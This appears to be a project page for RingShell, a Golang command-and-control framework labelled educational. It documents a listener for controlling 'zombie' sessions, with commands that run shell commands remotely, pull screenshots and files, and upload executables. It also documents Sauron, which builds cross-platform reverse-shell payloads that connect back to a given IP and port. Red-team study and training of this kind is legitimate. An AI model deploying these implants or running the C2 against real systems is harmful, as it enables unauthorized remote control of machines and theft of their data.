# RingShell Project

=== "Description"
    **RingShell** is a lightweight **Command and Control (C2)** framework written in **Golang**, intended for **educational purposes** in offensive security. It supports reverse shell payloads and can be extended with custom modules or payloads. RingShell is composed of two primary components:

    1. **Listener** – A shell interface for managing sessions with compromised systems.

    2. **Payload Generator (Sauron)** – A binary generator for cross-platform reverse shell payloads.

=== "Code"
    ``` golang title="main.go" linenums="1"
    package main
    import (
        "flag"
        "fmt"
        "www.github.com/MustafaAbdulazizHamza/RingShellListener/Art"
        "www.github.com/MustafaAbdulazizHamza/RingShellListener/Server"
    )
    func main() {
        port := flag.Int("p", 8888, "Port number for the server to listen on")
        flag.Parse()
        Art.Art()
        fmt.Printf("Starting server on port %d...\n", *port)
        Server.Server(*port)
    }
    ```
=== "Documentation"

    ### RingShell Documentation v1.0

    ![RingShell](https://github.com/MustafaAbdulazizHamza/RingShell/blob/main/ringShell.png?raw=true)
    **RingShell** is a lightweight **Command and Control (C2)** framework written in **Golang**, intended for **educational purposes** in offensive security. It supports reverse shell payloads and can be extended with custom modules or payloads. RingShell is composed of two primary components:

    1. **Listener** – A shell interface for managing sessions with compromised systems.
    2. **Payload Generator (Sauron)** – A binary generator for cross-platform reverse shell payloads.

    ---

    ### 🧪 Installation

    #### Prerequisites

    - Linux-based environment
    - [Go Programming Language](https://golang.org/dl/)

    #### Setup

    ```bash
    git clone https://github.com/MustafaAbdulazizHamza/RingShell.git
    cd RingShell/RingShell
    go build -o RingShell
    cd ../Sauron
    go build -o sauron
    ```

    ---

    ### 📚 Terminology

    1. **Ring**  
    A **Ring** refers to a deployed RingShell payload. It is the agent (or implant) that establishes a connection back to the C2 infrastructure, allowing remote control of the target system.

    2. **Servers**  
    In RingShell, a **Server** is a TCP endpoint created using the `bind` command. It can be one of the following:
    
    - **Listening Server**:  
        A passive server that receives data (e.g., screenshots, logs) from a payload. It acts as a dropbox-style endpoint for exfiltration or monitoring.
    
    - **Controlling Server**:  
        An active C2 component that maintains an interactive connection with one or more Rings. It sends commands and receives outputs from the connected agents.

    3. **Sauron**  
    **Sauron** is the command-line tool used to generate Rings (payloads). It supports custom parameters like target OS, architecture, listener IP/port, and output directory. The result is a compiled binary that can be deployed on the target system.
    ---

    ### 🛰️ RingShell Listener

    The **RingShell Listener** provides an interactive CLI for managing active sessions, executing commands, transferring files, and controlling the C2 infrastructure.

    #### 🧾 General Syntax

    ```bash
    command [subcommand] [arguments...]
    ```

    > Some commands require a selected session via `listen <session_id>`.

    ---

    #### 📖 Command Reference

    Below is a table summarizing all available built-in commands:

    | Command | Syntax | Description |
    |--------|--------|-------------|
    | **listen** | `listen <session_id>` | Focuses interaction on a specific zombie session. |
    | **q!** | `q!` | Exits the RingShell interface. |
    | **list** | `list [sessions \| servers] [listening \| controlling]` | Lists all active sessions or servers. |
    | **set** | `set <option> <value>` | Sets global parameters: `port`, `timeout`, `out`. |
    | **get** | `get <screenshots \| image \| file> [filename(s)]` | Retrieves data or files from the target. |
    | **bind** | `bind <listening \| controlling> <port> [named <name>]` | Launches a server on the specified port. |
    | **send** | `send To <controlling_server> <command \| file> <arg>` | Sends a command or script file to a controller. |
    | **kill** | `kill <controlling \| listening> <name>` | Terminates a running server. |
    | **import** | `import <script_file>` | Executes a RingShell script. |
    | **upload** | `upload <file \| executable> <path>` | Uploads a file to the remote session. |
    | *(any other command)* | `<command>` | Sent directly to the active session. |

    ---

    #### 🔄 Session-Specific Commands

    After using `listen <session_id>`, all subsequent inputs are interpreted as commands for that session.

    **Example:**
    ```bash
    listen zombie01
    whoami
    cd /tmp
    ls -al
    ```

    If no session is selected, the shell will warn:

    ```text
    You must specify a session ID before attempting to send a command.
    ```

    ---

    #### 💡 Auto-Completion

    RingShell includes intelligent auto-completion with:

    - Session and server ID suggestions
    - File and path hints
    - Syntax assistance for multi-level commands

    ---

    ### 🧪 Sauron: Payload Generator

    **Sauron** is a CLI utility that generates RingShell reverse shell binaries. It supports multiple platforms and architectures.

    #### 🔧 Usage

    ```bash
    Usage of ./Sauron:
    A tool that is used to generate rings based on user input.

    Flags:
    -arch string      Target architecture (e.g., amd64)
    -ip string        Listener IP address
    -os string        Target operating system (lowercase)
    -out string       Full path to output directory
    -port int         Port to connect back to

    Example:
    ./sauron -ip 192.168.1.10 -port 8080 -os windows -arch amd64 -out /home/user/output/
    ```

    ---

    ### 🔐 Disclaimer

    This tool is intended strictly for **educational** and **research** purposes in controlled environments.  
    Misuse against systems without authorization is **illegal** and **prohibited**.

=== "Download"
    [![GitHub](https://img.shields.io/badge/Source-GitHub-blue)](https://github.com/MustafaAbdulazizHamza/RingShell)
